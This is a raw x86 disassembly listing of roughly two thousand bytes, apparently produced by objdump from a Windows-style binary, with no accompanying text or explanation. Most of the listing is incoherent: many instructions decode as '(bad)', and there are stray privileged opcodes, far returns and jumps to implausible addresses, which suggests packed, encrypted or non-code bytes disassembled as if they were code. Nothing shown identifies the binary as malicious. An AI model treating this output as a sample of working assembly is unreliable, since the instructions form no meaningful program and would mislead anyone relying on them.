  40a424:	lea    ecx,[ebx-0x30074f4]
  40a42a:	call   0x41afaf
  40a42f:	add    BYTE PTR [ebp+0x0],cl
  40a432:	jne    0x40a475
  40a434:	dec    DWORD PTR [ebx-0x76210314]
  40a43a:	dec    ebp
  40a43b:	add    DWORD PTR [ebp+0x0],esi
  40a43e:	(bad)  
  40a43f:	xchg   ebp,eax
  40a440:	loopne 0x40a441
  40a442:	inc    eax
  40a443:	inc    DWORD PTR [eax]
  40a445:	mov    ecx,DWORD PTR [ebp-0x4]
  40a448:	xor    edx,DWORD PTR [edx+0x7201b8]
  40a44e:	add    BYTE PTR [edx],dl
  40a450:	enter  0x4d90,0x0
  40a454:	mov    eax,DWORD PTR [eax]
  40a456:	hlt    
  40a457:	add    al,0xa5
  40a459:	mov    al,0xff
  40a45b:	add    bh,bh
  40a45d:	add    BYTE PTR [ebx],dh
  40a45f:	inc    DWORD PTR [ebx]
  40a461:	sbb    al,0x89
  40a463:	jne    0x40a43d
  40a465:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40a46b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40a471:	mov    DWORD PTR [eax-0x70],0xee58e189
  40a478:	inc    DWORD PTR [ebp-0x75]
  40a47b:	ror    DWORD PTR [esp+ebp*8],1
  40a47e:	test   DWORD PTR [esi-0x1],esp
  40a481:	inc    ebp
  40a482:	(bad)  
  40a483:	aas    
  40a484:	inc    ebp
  40a485:	(bad)  
  40a486:	lea    edi,[esp+eiz*2-0x1]
  40a48a:	push   DWORD PTR [edi]
  40a48c:	mov    DWORD PTR [ecx],esi
  40a48e:	mov    al,ds:0x8b8000c7
  40a493:	out    dx,al
  40a494:	cld    
  40a495:	call   0xed3fea27
  40a49a:	(bad)  
  40a49b:	fisttp WORD PTR [eax+0x8801c7]
  40a4a1:	jmp    0x40a4e8
  40a4a3:	out    dx,al
  40a4a4:	inc    DWORD PTR [ebp-0x4]
  40a4a7:	xlat   BYTE PTR ds:[ebx]
  40a4a8:	lea    edi,[edi]
  40a4aa:	inc    edi
  40a4ac:	jmp    FWORD PTR [eax-0x78]
  40a4af:	inc    DWORD PTR [ecx]
  40a4b1:	aaa    
  40a4b2:	add    BYTE PTR [ecx],dh
  40a4b4:	pop    ecx
  40a4b5:	mov    DWORD PTR [eax],0xfff856c
  40a4bb:	ffreep st(5)
  40a4bd:	aas    
  40a4be:	add    bh,al
  40a4c0:	mov    esi,DWORD PTR [eax-0x4]
  40a4c3:	inc    DWORD PTR [eax+0xdf01ec]
  40a4c9:	(bad)  
  40a4ca:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40a4ce:	mov    esp,ebx
  40a4d0:	xchg   esp,eax
  40a4d1:	rol    DWORD PTR [eax],cl
  40a4d3:	(bad)  
  40a4d4:	mov    edi,DWORD PTR [eax+0x3]
  40a4d7:	(bad)  
  40a4d8:	cmp    al,0xd7
  40a4da:	dec    ebp
  40a4db:	lds    ecx,FWORD PTR [ebx+0x2ad8e8]
  40a4e1:	add    BYTE PTR [ebp-0x3b375],cl
  40a4e7:	adc    BYTE PTR [edx+0x1],0x55
  40a4eb:	add    BYTE PTR [ebx+0x6c8c30],cl
  40a4f1:	add    BYTE PTR [ebx-0x778afc7b],cl
  40a4f7:	mov    eax,DWORD PTR [eax]
  40a4f9:	cld    
  40a4fa:	push   0x7d
  40a4fc:	dec    DWORD PTR [ebx+0xd88c]
  40a502:	push   edx
  40a503:	mov    edx,DWORD PTR [ecx-0x4]
  40a506:	call   DWORD PTR [eax+0x7d01fc]
  40a50c:	mov    ecx,DWORD PTR [ebx+0x509000fc]
  40a512:	add    DWORD PTR [esi+0x0],edx
  40a515:	test   DWORD PTR [ebp+0x75],eax
  40a518:	call   0xc83d85a8
  40a51d:	jge    0x40a4b3
  40a51f:	mov    ebp,ebx
  40a521:	fcom   st(7)
  40a523:	add    bh,al
  40a525:	mov    ebx,DWORD PTR [eax-0x7a6f8304]
  40a52b:	add    edi,edi
  40a52d:	add    bh,bh
  40a52f:	imul   esp,ecx,0x4550d400
  40a535:	push   esi
  40a536:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40a53c:	test   BYTE PTR [ebx],dh
  40a53e:	aam    0x5
  40a540:	retf   0x4572
  40a543:	add    bl,ah
  40a545:	rcl    ebx,0x84
  40a548:	mov    DWORD PTR [ecx],0x46d1008c
  40a54e:	jl     0x40a550
  40a550:	test   edi,eax
  40a552:	jmp    esp
  40a554:	inc    DWORD PTR [eax]
  40a556:	loope  0x40a558
  40a558:	aam    0x75
  40a55a:	test   DWORD PTR [ebx+0x45fffcff],ecx
  40a560:	out    dx,al
  40a561:	mov    ebp,eax
  40a563:	mov    ah,0x85
  40a565:	add    bh,bh
  40a567:	call   0x114d06b
  40a56c:	retf   0x858b
  40a56f:	cld    
  40a570:	inc    DWORD PTR [eax+0xeb01ff]
  40a576:	out    dx,al
  40a577:	xor    BYTE PTR [ebp-0xff001e],al
  40a57d:	mov    edx,ecx
  40a57f:	cld    
  40a580:	jl     0x40a50b
  40a582:	mov    edx,0x50000001
  40a587:	add    DWORD PTR [ebp+0x45],eax
  40a58a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40a590:	dec    DWORD PTR [ebx-0x3fd80318]
  40a596:	add    BYTE PTR [ebp-0xbf0040],dl
  40a59c:	inc    ebp
  40a59d:	xor    DWORD PTR [ebx-0x4faf0400],ecx
  40a5a3:	inc    ebp
  40a5a4:	add    DWORD PTR [ebx+0x459c00],ecx
  40a5aa:	mov    edi,edi
  40a5ac:	mov    eax,0xe80800ff
  40a5b1:	inc    ebp
  40a5b2:	sub    cl,BYTE PTR [ebx-0x47000400]
  40a5b8:	add    al,0x1
  40a5ba:	rol    BYTE PTR [eax],0x1e
  40a5bd:	jne    0x40a604
  40a5bf:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40a5c5:	inc    DWORD PTR [ecx]
  40a5c7:	call   0x85cfcc
  40a5cc:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40a5d2:	call   0x40cfd8
  40a5d7:	xor    bh,bh
  40a5d9:	push   edi
  40a5da:	adc    BYTE PTR [ebx-0x747423bb],al
  40a5e0:	loopne 0x40a5be
  40a5e2:	ret    
  40a5e3:	loopne 0x40a583
  40a5e5:	xor    DWORD PTR [edx],0x31
  40a5e8:	cmp    edi,edi
  40a5ea:	bswap  esp
  40a5ec:	rol    BYTE PTR gs:[eax],0x5
  40a5f0:	jmp    0x12ba73a
  40a5f5:	mov    eax,DWORD PTR [ebp-0x4]
  40a5f8:	add    BYTE PTR [eax+0xff0100],bh
  40a5fe:	cld    
  40a5ff:	jne    0x40a67e
  40a601:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40a607:	mov    DWORD PTR [ecx],0x30500000
  40a60d:	inc    ebp
  40a60e:	add    BYTE PTR [ebx+0x459850],cl
  40a614:	mov    edi,edi
  40a616:	test   al,0xff
  40a618:	add    BYTE PTR [eax],cl
  40a61a:	inc    DWORD PTR [ebp-0x18]
  40a61d:	jmp    DWORD PTR [esi]
  40a61f:	fadd   QWORD PTR [eax]
  40a621:	jge    0x40a670
  40a623:	adc    BYTE PTR [ebx+0x459cb9],cl
  40a629:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40a62f:	sahf   
  40a630:	mov    eax,0x30132
  40a635:	lea    esi,[ebp+0x2c]
  40a638:	xor    edi,edi
  40a63a:	(bad)  
  40a63b:	call   0x13fcfa8
  40a640:	call   0x134d0d0
  40a645:	jne    0x40a5d2
  40a647:	xor    edi,esp
  40a649:	add    eax,DWORD PTR [eax+0xc018d]
  40a64f:	push   DWORD PTR [eax]
  40a651:	call   0xc9cfad
  40a656:	int3   
  40a657:	inc    DWORD PTR [ebp-0x14]
  40a65a:	mov    ecx,DWORD PTR [ebp-0x28]
  40a65d:	xor    eax,DWORD PTR [eax]
  40a65f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40a665:	(bad)  
  40a666:	xchg   ebp,eax
  40a667:	in     al,0xff
  40a669:	add    bh,bh
  40a66b:	add    BYTE PTR [esi],al
  40a66d:	inc    ebp
  40a66e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40a674:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff62]
  40a67b:	mov    edi,edi
  40a67d:	or     BYTE PTR [eax],cl
  40a67f:	inc    ebp
  40a680:	test   DWORD PTR gs:[eax],eax
  40a683:	je     0x40a6ca
  40a685:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40a68b:	xor    edx,DWORD PTR [eax-0x73]
  40a68e:	push   ebp
  40a68f:	or     BYTE PTR [ebp+0x21007572],al
  40a695:	inc    ebp
  40a696:	in     al,dx
  40a697:	mov    ebp,DWORD PTR [eax]
  40a699:	mov    esp,0x628bc345
  40a69e:	fmul   st,st(5)
  40a6a0:	add    BYTE PTR [ebx],ch
  40a6a2:	mov    eax,DWORD PTR [ebx]
  40a6a4:	cld    
  40a6a5:	loopne 0x40a667
  40a6a7:	inc    ebp
  40a6a8:	push   ebp
  40a6a9:	cmp    ebp,eax
  40a6ab:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  40a6b2:	cld    
  40a6b3:	fadd   DWORD PTR [eax+0x3b014d]
  40a6b9:	jne    0x40a6eb
  40a6bb:	push   0xf8898557
  40a6c0:	in     al,dx
  40a6c1:	jne    0x40a708
  40a6c3:	lea    eax,[ebx+0x72e8dcc8]
  40a6c9:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  40a6cf:	jmp    0x40a704
  40a6d1:	mov    edi,DWORD PTR [edi+0x4572bc]
  40a6d7:	xor    eax,edi
  40a6d9:	adc    DWORD PTR [ebp-0xcd0062],0x8b9231
  40a6e3:	rcl    BYTE PTR [eax-0x40],1
  40a6e6:	inc    ebp
  40a6e7:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40a6ef:	inc    ebp
  40a6f0:	xchg   ebp,eax
  40a6f1:	ud0    ebp,DWORD PTR [ebx]
  40a6f4:	inc    DWORD PTR [eax]
  40a6f6:	jl     0x40a76e
  40a6f8:	add    BYTE PTR [edx+0x1f558050],cl
  40a6fe:	mov    ecx,DWORD PTR [esp+esi*8]
  40a701:	inc    eax
  40a702:	retf   
  40a703:	inc    ebp
  40a704:	iret   
  40a705:	jb     0x40a6cf
  40a707:	mov    eax,DWORD PTR [edi]
  40a709:	enter  0x4545,0x1
  40a70d:	xor    eax,0x898b9c00
  40a712:	mov    esp,0x33344df0
  40a717:	pushf  
  40a718:	lea    ecx,[ecx+0x4d72e008]
  40a71e:	add    BYTE PTR [ebx],dh
  40a720:	inc    ebp
  40a721:	mov    DWORD PTR [ebx-0x3f611b4c],ecx
  40a727:	xor    dl,BYTE PTR [edx]
  40a729:	add    eax,DWORD PTR [ebp-0x77]
  40a72c:	mov    eax,esp
  40a72e:	fmul   DWORD PTR [ebp-0x3d]
  40a731:	xor    eax,DWORD PTR [ebx+eax*1+0x832899e]
  40a738:	mov    DWORD PTR [ebp-0x28],eax
  40a73b:	aad    0x45
  40a73d:	pushf  
  40a73e:	xor    eax,edi
  40a740:	mov    ecx,0xff858db0
  40a745:	clc    
  40a746:	enter  0x4d45,0x32
  40a74a:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40a751:	test   esi,edi
  40a753:	clc    
  40a754:	inc    DWORD PTR [ebp+0x45]
  40a757:	xor    BYTE PTR [ebx-0x3738f764],cl
  40a75d:	test   al,0x16
  40a75f:	test   DWORD PTR ds:0xff459cf8,esi
  40a765:	ds cld 
  40a767:	pushf  
  40a768:	inc    ebp
  40a769:	mov    edx,DWORD PTR [eax-0x28]
  40a76c:	outs   dx,DWORD PTR ds:[esi]
  40a76d:	push   ebp
  40a76e:	add    BYTE PTR [ebx],dh
  40a770:	mov    DWORD PTR [ebx],eax
  40a772:	sar    BYTE PTR [ebx],1
  40a774:	adc    BYTE PTR [edi],cl
  40a776:	dec    ebp
  40a777:	adc    al,0x8b
  40a779:	add    al,dl
  40a77b:	jmp    0x101a94b
  40a780:	jb     0x40a7cf
  40a782:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40a788:	xor    ecx,DWORD PTR [ebp+0x3b]
  40a78b:	xor    ecx,DWORD PTR [edi]
  40a78d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40a791:	(bad)  
  40a793:	clc    
  40a794:	enter  0x8400,0x8b
  40a798:	pop    es
  40a799:	mov    al,0x0
  40a79b:	push   ebp
  40a79c:	push   cs
  40a79d:	xor    ecx,eax
  40a79f:	xor    esp,ecx
  40a7a1:	add    ebp,DWORD PTR [eax]
  40a7a3:	add    esi,DWORD PTR [eax]
  40a7a5:	(bad)  
  40a7a7:	retf   0x55c8
  40a7aa:	repnz mov eax,DWORD PTR [ebp-0x10]
  40a7ae:	(bad)  
  40a7af:	cli    
  40a7b0:	fdivr  st,st(1)
  40a7b2:	test   DWORD PTR [eax+edi*8],ecx
  40a7b5:	dec    ebp
  40a7b6:	inc    ebp
  40a7b7:	xor    edi,DWORD PTR [eax-0x7167afd]
  40a7bd:	add    BYTE PTR [ebp+0x0],al
  40a7c0:	mov    ecx,DWORD PTR [ebp-0x28]
  40a7c3:	mov    ecx,ebx
  40a7c5:	clc    
  40a7c6:	jne    0x40a793
  40a7c8:	mov    esi,0xd672d3
  40a7cd:	into   
  40a7ce:	into   
  40a7cf:	scas   eax,DWORD PTR es:[edi]
  40a7d0:	dec    ebp
  40a7d1:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40a7d7:	sub    ecx,esi
  40a7d9:	cmp    ecx,DWORD PTR [ebp+0x77]
  40a7dc:	(bad)  
  40a7dd:	mov    edi,eax
  40a7df:	mov    al,0x85
  40a7e1:	mov    eax,edi
  40a7e3:	add    BYTE PTR [ebp-0x75],al
  40a7e6:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40a7ed:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40a7f3:	rdtsc  
  40a7f5:	retf   0x559c
  40a7f8:	(bad)  
  40a7f9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40a800:	inc    ebp
  40a801:	add    eax,0xeb9c4d3f
  40a806:	(bad)  
  40a807:	mov    ecx,esp
  40a809:	lods   al,BYTE PTR ds:[esi]
  40a80a:	test   DWORD PTR [ebp-0x8],edx
  40a80d:	xor    ecx,DWORD PTR [ebp+0x33]
  40a810:	mov    eax,DWORD PTR [ebx]
  40a812:	lock add ecx,ebx
  40a815:	bswap  esi
  40a817:	retf   0x55d1
  40a81a:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40a820:	jmp    0x40a81b
  40a822:	add    BYTE PTR ds:0xebc44d8b,al
  40a828:	push   ebp
  40a829:	mov    ebp,DWORD PTR [ebx]
  40a82b:	test   al,0x8b
  40a82d:	push   ebp
  40a82e:	clc    
  40a82f:	xor    ecx,ebx
  40a831:	xor    ecx,esi
  40a833:	add    edx,ecx
  40a835:	add    eax,DWORD PTR [edx+0xca010f]
  40a83b:	push   ebp
  40a83c:	dec    ebp
  40a83d:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40a843:	stc    
  40a844:	rol    DWORD PTR ds:0xebce4dd6,cl
  40a84a:	scas   eax,DWORD PTR es:[edi]
  40a84b:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40a851:	xor    ebp,DWORD PTR [ebx]
  40a853:	xor    edi,DWORD PTR [ebx]
  40a855:	add    esi,DWORD PTR [edi+0x3]
  40a858:	mov    ecx,DWORD PTR [edi]
  40a85a:	clc    
  40a85b:	retf   0x55cb
  40a85e:	into   
  40a85f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40a866:	mov    eax,0x3376554d
  40a86b:	mov    esi,DWORD PTR [ebx]
  40a86d:	int3   
  40a86e:	add    edx,DWORD PTR [ebp+0x3]
  40a871:	xor    ecx,DWORD PTR [edi]
  40a873:	xor    ecx,edx
  40a875:	add    edx,DWORD PTR [ebp+0x3]
  40a878:	mov    ecx,DWORD PTR [edi]
  40a87a:	lock retf 0x4dfa
  40a87e:	stc    
  40a87f:	mov    ecx,DWORD PTR [eax]
  40a881:	or     BYTE PTR [ebp+0x4d],cl
  40a884:	jmp    0x104a914
  40a889:	dec    ebp
  40a88a:	dec    ebp
  40a88b:	(bad)  
  40a88c:	mov    ebx,esp
  40a88e:	clc    
  40a88f:	test   ebx,ecx
  40a891:	clc    
  40a892:	ror    DWORD PTR [ebp-0x2a],cl
  40a895:	mov    esi,ecx
  40a897:	call   0x33cbee4b
  40a89c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40a8a3:	retf   
  40a8a4:	ja     0x40a874
  40a8a6:	mov    ebp,DWORD PTR [eax-0x48]
  40a8a9:	dec    ebp
  40a8aa:	xor    ecx,DWORD PTR [di+0x3]
  40a8ae:	mov    esp,esp
  40a8b0:	clc    
  40a8b1:	push   ebp
  40a8b2:	retf   
  40a8b3:	mov    dl,bl
  40a8b5:	adc    esi,edx
  40a8b7:	jb     0x40a887
  40a8b9:	add    BYTE PTR [edi-0x3b7474b3],ch
  40a8bf:	call   0x4d6c7441
  40a8c4:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40a8ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8cb:	sahf   
  40a8cc:	inc    ebp
  40a8cd:	xor    cl,BYTE PTR [ebp-0x78]
  40a8d0:	mov    edx,edi
  40a8d2:	clc    
  40a8d3:	dec    ebp
  40a8d4:	retf   
  40a8d5:	mov    edx,ebx
  40a8d7:	call   0x560f7cb2
  40a8dc:	scas   eax,DWORD PTR es:[edi]
  40a8dd:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40a8e3:	sahf   
  40a8e4:	sub    esi,DWORD PTR [edx]
  40a8e6:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40a8ec:	lods   al,BYTE PTR ds:[esi]
  40a8ed:	xor    esp,DWORD PTR [ebx]
  40a8ef:	add    ecx,DWORD PTR [ebp-0x1c]
  40a8f2:	mov    edi,DWORD PTR [ebp-0x8]
  40a8f5:	mov    bl,cl
  40a8f7:	cmp    dl,bl
  40a8f9:	jb     0x40a8c9
  40a8fb:	add    dh,dl
  40a8fd:	dec    ebp
  40a8fe:	scas   eax,DWORD PTR es:[edi]
  40a8ff:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40a905:	shr    DWORD PTR [ebx],cl
  40a907:	into   
  40a908:	cmp    edx,esi
  40a90a:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40a910:	dec    ebp
  40a911:	dec    ebp
  40a912:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40a918:	retf   
  40a919:	xor    edx,esi
  40a91b:	add    ecx,esi
  40a91d:	imul   ecx,edx
  40a920:	mov    DWORD PTR [ebp+0x8],edx
  40a923:	xor    ecx,DWORD PTR [ebp+0x2b]
  40a926:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40a92c:	add    esi,DWORD PTR [ebx]
  40a92e:	mov    ah,0x3
  40a930:	inc    ebp
  40a931:	sysexit 
  40a933:	xlat   BYTE PTR ds:[ebx]
  40a934:	pushf  
  40a935:	jge    0x40a8c0
  40a937:	xor    ebx,eax
  40a939:	sub    eax,DWORD PTR [ebp-0x73]
  40a93c:	(bad)  
  40a93d:	cmp    al,al
  40a93f:	jb     0x40a8c6
  40a941:	add    al,bh
  40a943:	ror    DWORD PTR [ebp-0x7a],1
  40a946:	xor    edi,edi
  40a948:	add    edi,edi
  40a94a:	jmp    0x40a999
  40a94c:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40a952:	dec    ebp
  40a953:	into   
  40a954:	mov    ebp,DWORD PTR [edi-0x23737428]
  40a95a:	sahf   
  40a95b:	shl    DWORD PTR [edx],cl
  40a95d:	retf   0x5588
  40a960:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40a966:	add    eax,DWORD PTR [eax]
  40a968:	in     al,0x4d
  40a96a:	push   ebp
  40a96b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40a971:	bound  eax,QWORD PTR [eax]
  40a973:	int    0x4d
  40a975:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40a97b:	dec    ebp
  40a97c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40a982:	jge    0x40a952
  40a984:	mov    BYTE PTR [edi+0xf723b3a],ch
  40a98a:	add    cl,dh
  40a98c:	dec    ebp
  40a98d:	dec    DWORD PTR [ebx-0x2c032375]
  40a993:	adc    BYTE PTR [ebp+0x1],0x8b
  40a997:	add    al,bl
  40a999:	jge    0x40a927
  40a99b:	push   0xffffff9e
  40a99d:	push   0x8b3032
  40a9a2:	shl    BYTE PTR [ebp+0x55],0x6a
  40a9a6:	xor    edi,edi
  40a9a8:	xor    edx,DWORD PTR [ebx+eax*1]
  40a9ab:	inc    ebp
  40a9ac:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40a9b2:	dec    ebp
  40a9b3:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40a9b9:	jbe    0x40a946
  40a9bb:	mov    ebp,esp
  40a9bd:	ror    bl,1
  40a9bf:	enter  0x14ce,0xaf
  40a9c3:	dec    DWORD PTR [ebx-0x2cef17f8]
  40a9c9:	push   ebp
  40a9ca:	retf   0x5540
  40a9cd:	push   ebp
  40a9ce:	mov    esi,DWORD PTR [edx-0x1c]
  40a9d1:	mov    edx,ebx
  40a9d3:	cld    
  40a9d4:	(bad)  
  40a9d5:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40a9dc:	sti    
  40a9dd:	add    dh,cl
  40a9df:	push   0xffffff94
  40a9e1:	call   FWORD PTR [esi+0x3b5032d0]
  40a9e7:	mov    ecx,DWORD PTR [edi]
  40a9e9:	int3   
  40a9ea:	pop    esi
  40a9eb:	inc    ebp
  40a9ec:	dec    DWORD PTR [ecx+0x45e8c88b]
  40a9f2:	push   ebp
  40a9f3:	xor    esi,DWORD PTR [ebx]
  40a9f5:	mov    DWORD PTR [ebx],0xcacc0f9c
  40a9fb:	aas    
  40a9fc:	push   ebp
  40a9fd:	inc    ebp
  40a9fe:	xor    eax,esp
  40aa00:	add    eax,esp
  40aa02:	mov    eax,DWORD PTR [ebx]
  40aa04:	(bad)  
  40aa05:	jmp    0x40a993
  40aa07:	mov    bl,BYTE PTR [esi-0x7674cdfb]
  40aa0d:	rol    ah,1
  40aa0f:	mov    esi,0xf133104d
  40aa14:	mov    edx,0xff358d80
  40aa19:	mov    dh,0xd1
  40aa1b:	cmp    edx,DWORD PTR [ebp+0xf]
  40aa1e:	mov    eax,DWORD PTR [edx-0x20]
  40aa21:	add    BYTE PTR [ebp-0x75],bh
  40aa24:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40aa2b:	sahf   
  40aa2c:	retf   0x8632
  40aa2f:	cmp    ebp,0x8
  40aa32:	call   ebx
  40aa34:	inc    ebp
  40aa35:	inc    ebp
  40aa36:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40aa3c:	mov    esi,DWORD PTR ds:0xc7049cc8
  40aa42:	add    al,al
  40aa44:	add    bl,al
  40aa46:	(bad)  
  40aa47:	clc    
  40aa48:	enter  0x45,0x35
  40aa4c:	push   eax
  40aa4d:	pushf  
  40aa4e:	mov    edi,eax
  40aa50:	int3   
  40aa51:	or     al,al
  40aa53:	test   DWORD PTR [edi],edi
  40aa55:	clc    
  40aa56:	gs inc ebp
  40aa58:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40aa5e:	push   ss
  40aa5f:	xor    ecx,DWORD PTR [ebp+0x3]
  40aa62:	sub    edx,DWORD PTR [ecx-0x76]
  40aa65:	dec    ebp
  40aa66:	add    DWORD PTR [ebx+0x88d845],ecx
  40aa6c:	mov    esi,DWORD PTR [ebx]
  40aa6e:	or     BYTE PTR [ebx],al
  40aa70:	cmp    edx,DWORD PTR [ecx-0x38]
  40aa73:	dec    ebp
  40aa74:	out    dx,eax
  40aa75:	xor    eax,DWORD PTR [ebp+0x3]
  40aa78:	mov    edx,DWORD PTR [ecx-0x28]
  40aa7b:	dec    ebp
  40aa7c:	add    BYTE PTR [ebx],dh
  40aa7e:	push   0x518003
  40aa83:	push   eax
  40aa84:	add    BYTE PTR [ebx-0x300748b],cl
  40aa8a:	sbb    BYTE PTR [ebp+0x45],cl
  40aa8d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40aa93:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40aa99:	dec    ebp
  40aa9a:	inc    ebp
  40aa9b:	xor    eax,esp
  40aa9d:	add    eax,esp
  40aa9f:	push   ecx
  40aaa0:	(bad)  
  40aaa1:	dec    ebp
  40aaa2:	mov    al,ds:0xc9e031ff
  40aaa7:	retf   
  40aaa8:	(bad)  
  40aaa9:	into   
  40aaaa:	sub    bh,bh
  40aaac:	dec    esp
  40aaad:	adc    al,0x9c
  40aaaf:	inc    ebp
  40aab0:	push   ebp
  40aab1:	test   DWORD PTR [edi],ecx
  40aab3:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab6ff80]
  40aaba:	jmp    0xc9b9b9ce
  40aabf:	add    cl,dl
  40aac1:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40aacb:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40aad1:	rol    BYTE PTR [eax],0x57
  40aad4:	clc    
  40aad5:	bound  esi,QWORD PTR [edx+0x7]
  40aad8:	mov    eax,DWORD PTR [ebp-0x30]
  40aadb:	xor    al,0x40
  40aadd:	sub    al,0xc7
  40aadf:	mov    ah,ch
  40aae1:	add    DWORD PTR [ebp+0x4534f845],eax
  40aae7:	sub    al,0x86
  40aae9:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40aaf0:	mov    ch,0xff
  40aaf2:	clc    
  40aaf3:	add    DWORD PTR [ebp+0x60],0x31
  40aaf7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40aafe:	inc    ebp
  40aaff:	dec    DWORD PTR [ebx-0x341ff701]
  40ab05:	test   esi,ecx
  40ab07:	dec    DWORD PTR [ebx-0x7f8a3301]
  40ab0d:	push   eax
  40ab0e:	add    DWORD PTR [ebp+0x0],eax
  40ab11:	dec    ebx
  40ab13:	or     al,0xce
  40ab15:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40ab1c:	into   
  40ab1d:	add    BYTE PTR [ebx-0x34ff1400],cl
  40ab23:	mov    esi,ecx
  40ab25:	sar    bh,0x45
  40ab28:	adc    al,0x8b
  40ab2a:	clc    
  40ab2b:	fadd   DWORD PTR [ebp+0x0]
  40ab2e:	mov    ebp,DWORD PTR [edx+0x8]
  40ab31:	push   edi
  40ab32:	adc    BYTE PTR [eax+0x1],0x83
  40ab36:	add    al,al
  40ab38:	retf   
  40ab39:	mov    ecx,esi
  40ab3b:	cld    
  40ab3c:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40ab42:	into   
  40ab43:	add    BYTE PTR [ebx+0x756aec00],cl
  40ab49:	jne    0x40ab7e
  40ab4b:	inc    DWORD PTR [ebx]
  40ab4d:	rcl    BYTE PTR [ecx+0x50],1
  40ab50:	push   eax
  40ab51:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40ab57:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40ab5e:	sar    bh,0x84
  40ab61:	or     BYTE PTR [ebx],al
  40ab63:	push   eax
  40ab64:	add    BYTE PTR [ebx+0x4532c845],cl
  40ab6a:	pushf  
  40ab6b:	xor    eax,0x89b49cc7
  40ab70:	test   eax,ebp
  40ab72:	clc    
  40ab73:	inc    ebp
  40ab74:	inc    ebp
  40ab75:	mov    DWORD PTR [eax+eax*8],esi
  40ab78:	sub    al,0x34
  40ab7a:	mov    BYTE PTR [ebx+ecx*4+0x57d8ec89],bl
  40ab81:	dec    ebp
  40ab82:	bound  esi,QWORD PTR [ebx]
  40ab84:	inc    edi
  40ab85:	add    ecx,DWORD PTR [ebx+0x57f4b489]
  40ab8b:	dec    ebp
  40ab8c:	bound  esi,QWORD PTR [ebx]
  40ab8e:	inc    edi
  40ab8f:	add    eax,DWORD PTR [ebx-0xf7a377]
  40ab95:	inc    ebp
  40ab96:	add    ch,dl
  40ab98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab99:	pushf  
  40ab9a:	inc    edi
  40ab9c:	dec    esp
  40ab9e:	lea    eax,[ebp+0x45fff860]
  40aba4:	push   eax
  40aba5:	xor    dh,BYTE PTR [ebp-0x64]
  40aba8:	(bad)  
  40aba9:	(bad)  
  40abaa:	pop    esp
  40abab:	lods   al,BYTE PTR ds:[esi]
  40abac:	inc    DWORD PTR [ebp+0x4508f8ff]
  40abb2:	mov    esi,DWORD PTR [eax]
  40abb4:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40abbb:	test   DWORD PTR [edi-0x8],edx
  40abbe:	inc    esi
  40abbf:	inc    ebp
  40abc0:	add    BYTE PTR [esi],bh
  40abc2:	push   0x8b809c
  40abc7:	in     al,dx
  40abc8:	inc    ebp
  40abc9:	push   ebp
  40abca:	mov    esi,DWORD PTR [ebx]
  40abcc:	cld    
  40abcd:	add    eax,DWORD PTR [eax+0xf013b]
  40abd3:	adc    al,0x0
  40abd5:	add    bh,bh
  40abd7:	jmp    0xbdacf4
  40abdc:	add    BYTE PTR [ebp+0x45],cl
  40abdf:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40abe5:	dec    ebp
  40abe6:	push   0x38033
  40abeb:	cmp    eax,DWORD PTR [eax]
  40abed:	unpcklps xmm7,xmm0
